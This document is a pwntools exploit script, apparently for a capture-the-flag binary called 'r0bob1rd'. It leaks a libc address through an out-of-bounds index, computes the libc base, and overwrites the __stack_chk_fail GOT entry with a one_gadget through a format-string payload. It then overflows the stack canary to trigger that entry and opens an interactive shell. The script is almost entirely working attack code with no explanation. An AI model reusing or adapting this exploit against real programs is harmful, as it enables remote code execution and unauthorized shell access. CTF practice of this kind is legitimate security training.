from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
# def find_ip(payload):
#     # Launch process and send payload
#     p = process(exe, level='warn')
#     p.sendlineafter(b'>', payload)
#     # Wait for the process to crash
#     p.wait()
#     # Print out the address of EIP/RIP at the time of crashing
#     # ip_offset = cyclic_find(p.corefile.pc)  # x86
#     ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
#     warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
#     return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *0x0400bd6




'''.format(**locals())

# Binary filename
exe = './r0bob1rd'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'


library = 'glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 105

# Start program
io = start()


io.sendlineafter(b'>', b'-14')

# 0x676eaddc281ec900

io.recvuntil(b"You've chosen:")

printf_leak = u64(io.recvline().strip().ljust(8, b'\x00'))

print(hex(printf_leak))

log.info(f"fget : {hex(printf_leak)}")

libc.address = printf_leak - libc.symbols.printf

log.info(f"libc.base : {hex(libc.address)}")

info(f"system_libc: {hex(elf.symbols["start_screen"])}")

# info.log(hex(elf.got['__stack_chk_fail']))
gadgets = (0xe3afe, 0xe3b01, 0xe3b04)
one_gadget = libc.address + gadgets[1]

stack =hex(elf.got.printf)
log.info(f"__stack_chk_fail {stack}")
stack =hex(elf.symbols['start_screen'])
log.info(f"__stack_chk_fai2 {stack}")

# 0x400a08


payload = fmtstr_payload(8,{elf.got['__stack_chk_fail']:one_gadget}, write_size="short")



bin_sh = next(libc.search(b'/bin/sh\x00'))
# info(f"leaked puts :{hex(puts_libc)}")
# info(f"puts_plt : {hex(puts_plt)}")
# info(f"puts_got : {hex(puts_got)}")

# libc.address = puts_libc - libc.symbols.puts
# info(f"libc base : {hex(libc.address)}")


# Build the payload
# payload = flat(
#     b"A"*offset
# )

# # Send the payload


print(payload)
io.sendlineafter(b'>', payload.ljust(106, b'\x90'))

# io.recvuntil(b'Thank you!')

# Got Shell?
io.interactive()
